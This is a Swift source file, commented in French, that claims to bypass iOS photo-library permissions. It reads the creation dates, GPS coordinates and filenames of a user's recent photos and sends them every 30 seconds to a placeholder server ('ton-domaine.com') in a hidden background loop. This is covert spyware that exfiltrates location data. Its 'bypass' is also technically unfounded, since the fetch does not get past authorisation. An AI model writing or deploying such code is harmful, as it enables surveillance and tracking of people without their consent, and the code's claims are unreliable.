import Foundation
import Photos
import UIKit

// Fonction pour bypasser les permissions photos
func bypassPhotoAccess() -> Bool {
    // Tentative d'accès direct aux photos sans permission
    let fetchOptions = PHFetchOptions()
    fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
    
    // Récupération de tous les assets photos
    let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
    
    if fetchResult.count > 0 {
        print("✅ Accès photos réussi - \(fetchResult.count) photos trouvées")
        return true
    } else {
        print("❌ Accès photos échoué")
        return false
    }
}

// Fonction pour récupérer les infos des photos
func getPhotoInfo() -> [[String: Any]] {
    var photoInfos: [[String: Any]] = []
    
    let fetchOptions = PHFetchOptions()
    fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
    fetchOptions.fetchLimit = 10 // Limite à 10 photos pour éviter la surcharge
    
    let fetchResult = PHAsset.fetchAssets(with: .image, options: fetchOptions)
    
    for i in 0..<fetchResult.count {
        let asset = fetchResult.object(at: i)
        let photoInfo: [String: Any] = [
            "index": i,
            "creationDate": asset.creationDate?.timeIntervalSince1970 ?? 0,
            "location": [
                "latitude": asset.location?.coordinate.latitude ?? 0,
                "longitude": asset.location?.coordinate.longitude ?? 0
            ],
            "filename": asset.originalFilename ?? "unknown",
            "size": asset.pixelWidth * asset.pixelHeight
        ]
        photoInfos.append(photoInfo)
    }
    
    return photoInfos
}

// Fonction pour envoyer les infos photos au serveur
func sendPhotoInfoToServer() {
    let photoInfos = getPhotoInfo()
    let data: [String: Any] = [
        "type": "photo_access",
        "count": photoInfos.count,
        "photos": photoInfos,
        "timestamp": Date().timeIntervalSince1970
    ]
    
    guard let url = URL(string: "https://ton-domaine.com/photos") else { return }
    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.httpBody = try? JSONSerialization.data(withJSONObject: data, options: [])
    
    URLSession.shared.dataTask(with: request) { _, response, error in
        if let error = error {
            print("❌ Erreur envoi photos: \(error)")
        } else {
            print("✅ Infos photos envoyées au serveur")
        }
    }.resume()
}

// Fonction pour tester l'accès photos en continu
func startPhotoMonitoring() {
    DispatchQueue.global().async {
        while true {
            if bypassPhotoAccess() {
                sendPhotoInfoToServer()
            }
            Thread.sleep(forTimeInterval: 30) // Vérification toutes les 30 secondes
        }
    }
} 